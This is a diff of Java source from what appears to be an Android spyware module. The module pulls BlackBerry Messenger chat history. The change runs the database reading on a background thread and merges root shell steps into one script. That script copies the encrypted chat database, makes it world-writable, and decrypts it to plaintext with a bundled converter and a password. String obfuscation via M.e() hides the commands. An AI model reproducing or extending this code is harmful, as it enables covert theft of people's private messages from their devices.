@@ -108,41 +108,51 @@ public class ChatBBM extends SubModuleChat {
 			}
 			return;
 		}
-		GenericSqliteHelper helper = null;
 
-		try {
-			helper = GenericSqliteHelper.openCopy(dbFileMaster);
-			if (helper == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateHistory) cannot open db");
+
+		Thread t = new Thread(new Runnable() {
+			@Override
+			public void run() {
+				GenericSqliteHelper helper = null;
+				try {
+
+					helper = GenericSqliteHelper.openCopy(dbFileMaster);
+					if (helper == null) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (updateHistory) cannot open db");
+						}
+					}
+					if (helper == null) {
+						helper = openBBMChatEnc(dbFileMasterEnc);
+					}
+
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (start), read lastBBM: " + lastBBM);
+					}
+
+					if (Cfg.DEBUG) {
+						Check.asserts(account != null, " (updateHistory) Assert failed, null account");
+					}
+
+					readBBMChatHistory(helper);
+
+
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (updateHistory) Error: " + e);
+					}
+				} finally {
+					readChatSemaphore.release();
+					if (helper != null) {
+						helper.disposeDb();
+					}
+
 				}
 			}
-			if (helper == null) {
-				helper = openBBMChatEnc(dbFileMasterEnc);
-			}
+		});
+		t.start();
 
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start), read lastBBM: " + lastBBM);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.asserts(account != null, " (updateHistory) Assert failed, null account");
-			}
-
-			readBBMChatHistory(helper);
-
-
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateHistory) Error: " + e);
-			}
-		} finally {
-			if (helper != null) {
-				helper.disposeDb();
-			}
-			readChatSemaphore.release();
-		}
 	}
 
 	private GenericSqliteHelper openBBMChatEnc(String dbFileMasterEnc) {
@@ -173,28 +183,24 @@ public class ChatBBM extends SubModuleChat {
 
 		Execute.execute(M.e("/system/bin/chmod 755 ") + bbconvert.getFilename());
 
-		String command = String.format(M.e("cat %s > %s"), dbFileMasterEnc, dbenc);
-		Execute.executeRootAndForgetScript(command);
-		//ExecuteResult res = Execute.executeRoot(command);
+		String command = String.format(M.e("cat %s > %s;\n chmod 777 %s; \n"), dbFileMasterEnc, dbenc, dbenc);
+		command += String.format(M.e("%s %s %s %s\n"), bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
+		command += String.format(M.e("chmod 777 %s; \n"), dbplain);
 
-		ExecuteResult res = Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (openBBMChatEnc) execute: " + command + " ret: " + res.exitCode);
-		}
+		ExecuteResult res = Execute.executeScript(command);
 
 		if(!dbenc.exists()){
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc");
+				Check.log(TAG + " (openBBMChatEnc), ERROR dbenc not exists: " + dbenc);
 			}
 			return null;
 		}
 
-		command = String.format("%s %s %s %s", bbconvert.getFilename(), dbenc, dbplain.getFilename(), password);
-		res = Execute.execute(command);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (openBBMChatEnc) execute: " + bbconvert + " ret: " + res.exitCode);
+		if(!dbplain.exists()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openBBMChatEnc), ERROR dbplain not exists: " + dbenc);
+			}
+			return null;
 		}
 
 		bbconvert.delete();
